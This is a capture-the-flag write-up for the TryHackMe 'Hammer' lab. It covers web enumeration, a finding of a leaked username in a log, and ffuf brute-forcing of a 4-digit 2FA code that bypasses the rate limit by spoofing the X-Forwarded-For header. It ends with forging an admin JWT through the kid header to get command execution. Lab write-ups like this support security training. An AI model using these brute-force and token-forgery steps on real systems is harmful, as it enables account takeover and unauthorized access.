![image](https://github.com/user-attachments/assets/05fe257f-b4ab-4dde-986d-edb60916c432)

# THM-Hammer
Hammer is a medium rate challenge. I'll start with directory enumeration on a web server, where a legitimate username can be found. After that, I will bypass 2fa mechanisism that is required to reset the user's password. To achieve RCE, I crafted new JWT token for the admin user by modifying the header and payload of the current user's token. 

<h2>${\color{Blue}Recon}$</h2>
Nmap finds open ports: 

```
root@ip-10-10-248-70:~# nmap 10.10.81.149 -p- -sC -sV --min-rate 10000
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-02 17:44 BST
Nmap scan report for 10.10.81.149
Host is up (0.0021s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
MAC Address: 02:C0:73:06:11:D5 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A web server is running on port 1337. I tried some common credentials on the login page (admin@hammer.thm:admin, admin@hammer.thm:password) but none works. 
![image](https://github.com/user-attachments/assets/4e7900c4-8fbb-40c0-8927-46b2ddab6e2e)

Viewing the page source reviews the directory naming convetion "hmr_DIRECTORY_NAME"
![image](https://github.com/user-attachments/assets/a69c8cbe-d18f-4fe4-a506-5c5d72446dcf)

I'll use ffuf to find hidden directories. 

```
root@ip-10-10-248-70:~# ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u http://10.10.81.149:1337/hmr_FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.81.149:1337/hmr_FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

css                     [Status: 301, Size: 321, Words: 20, Lines: 10]
images                  [Status: 301, Size: 324, Words: 20, Lines: 10]
js                      [Status: 301, Size: 320, Words: 20, Lines: 10]
logs                    [Status: 301, Size: 322, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 9083 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

hmr_logs contains an error logfile from the webserver. A legitimate email "tester@hammer.thm" is recorded in the log. 

```
[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user **tester@hammer.thm**: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
```

From here, we can attempt to reset the password for this user. However, we must pass the 2FA check first. 
![image](https://github.com/user-attachments/assets/32c17d37-81aa-445f-9cb0-b49c2c7baf41)

![image](https://github.com/user-attachments/assets/fca02f5a-bbb0-4795-b090-a1898e789b1c)

After sending the request to Burp's Intruder, I mark the 'recovery_code' param, choose the 'number' payload type, and change the minimum digits to '4' (because recovery codes have 4 digits).
![image](https://github.com/user-attachments/assets/0122b34e-0941-4309-8b81-c60132e6a21c)

After about a few failed attempts, the webserver responsed that we have exceeded the rate-limit. To test if this is an IP-based restriction or a session-based one, I'll try to manipulate the [X-Forwarded-For header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Forwarded-For), which is for identifying the originating IP address of a client connecting to a web server. 

![image](https://github.com/user-attachments/assets/e4b73681-d900-4451-8ce6-ffe8d0e82671)

To generate the wordlist for token, I'll use the seq command with padding options.

```
seq -w 9999 > code.txt
```

ffuf is used again to brute-force the 2FA token. Here I filtered for empty responses and responses contains "Invalid" keyword, as shown when an invalid token is submitted. I also use the same wordlist to fuzz the value for the X-Forwarded-For header. 

![image](https://github.com/user-attachments/assets/91a4b2e6-9614-4577-99fe-842070abbc4d)


```
root@ip-10-10-248-70:~# ffuf -w code.txt -u http://10.10.81.149:1337/reset_password.php -X POST -d 'recovery_code=FUZZ&s=120' -H 'Content-Type: application/x-www-form-urlencoded' -H "X-Forwarded-For:FUZZ" -H "Cookie:PHPSESSID=so7dmfev7f9c73um8h5f1b1hen" -fr "Invalid" -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.81.149:1337/reset_password.php
 :: Wordlist         : FUZZ: code.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : X-Forwarded-For: FUZZ
 :: Header           : Cookie: PHPSESSID=so7dmfev7f9c73um8h5f1b1hen
 :: Data             : recovery_code=FUZZ&s=120
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 0
 :: Filter           : Regexp: Invalid
________________________________________________

8610                    [Status: 200, Size: 2191, Words: 595, Lines: 53]
```

<i> Note: The cookie is different from the one captured with Burp because when the rate limit expired, I was given a new session.</i>

The attack went smoothly, proving the rate-limit is IP-based. 
Once the correct token is submitted, I resetted the password and successfully logged in.

![image](https://github.com/user-attachments/assets/d9267f3d-1cf0-4056-a99b-5fbde3944a47)

<h2>${\color{Blue}Enumeration of dashboard.php}$</h2>

<b>Command execution</b>
The page allows me to execute OS commands, which could be used for RCE. However, only 'ls' command is allowed, but not other OS comamnds and I was always logged out after an interval. I found a keyfile, but not sure what it does exactly.

<img width="788" alt="image" src="https://github.com/user-attachments/assets/36bcf0c2-a51a-4ea3-a31a-7199b252544e" />


<img width="787" alt="image" src="https://github.com/user-attachments/assets/b73b09a7-a3cd-4ce9-a1f0-12b793a10972" />


<h2>${\color{Blue}Source code analysis}$</h2>
<h3><b>Persistent Session: </b></h3>
Here, we can see that a function is set so that user is logged out if cookie header 'persistentSession' is not found.  

![image](https://github.com/user-attachments/assets/f05266eb-1d71-4fc1-8b6f-4a2ed1351322)

![image](https://github.com/user-attachments/assets/6978ecca-90b7-4b97-a795-1e0c05c60e72)

To achieve a persistent session, I'll change cookie header 'persistentSession' to yes. 

![image](https://github.com/user-attachments/assets/0fec1920-dbf8-4e84-a47d-327c505b223d)

Unfortunately, I get logged out after some time. I've tried other values but couldn't the session so I'll skip that for now. 

<h3><b> Command execution authorization </b></h3>

![image](https://github.com/user-attachments/assets/febfe145-6df5-4dc6-b218-dbc1fcc08f0b)

The function (1)sends a POST request to <b>execute_command.php</b>, with (2)<b>Command</b> parameter contains the command to be executed in JSON format, and (3)an authorization header <b>'Authorization': 'Bearer ' + jwtToken</b>

![image](https://github.com/user-attachments/assets/64c06dd4-955a-4923-824b-1b056aec503f)


<h2><b>RCE</b></h2>
Using a [JWT token debugger](https://token.dev), I'll take a closer look at the structure of the token:

![image](https://github.com/user-attachments/assets/0b6e84dd-b85f-4165-ae47-90e5440b05b6)

The <b>kid</b> header seems to be the location of the signing key used by the server to verify the token. Onto the payload of the token, the <b>role</b> value is currently "user". I'll try to change its value to "admin" to execute addtional commands. 

![image](https://github.com/user-attachments/assets/8f902bd9-e56a-4be4-9f37-7d1cc9d9b02c)

I tried the 'ls' command however was unathorized due to an error related to signature verification. Perhaps, the key located at <b>/var/www/mykey.key</b> is for the tester user only.

![image](https://github.com/user-attachments/assets/2e0503ba-10f3-48dc-9f37-37c00cf494d3)

 I'll try the key I found earlier with the ls command, changing the location of <b>kid</b> header to "/var/www/html/188ade1.key". If the key location were "/var/www", we would have seen the keyfile "mykey.key" using the ls command. 

![image](https://github.com/user-attachments/assets/0c6ed5df-7dcf-47e4-89f5-fc0ba5fccc5b)

Adding the key value of <b>56058354efb3daa97ebab00fabd7a7d7</b> verifies the legitimacy of the new token. 

![image](https://github.com/user-attachments/assets/d0485e5d-8741-4ba4-8a6b-d98e27d0e6d9)

With the new token, I was able to freely execute command on the target.

![image](https://github.com/user-attachments/assets/95d4fc2d-e288-4658-886a-9ba8adffeeba)



































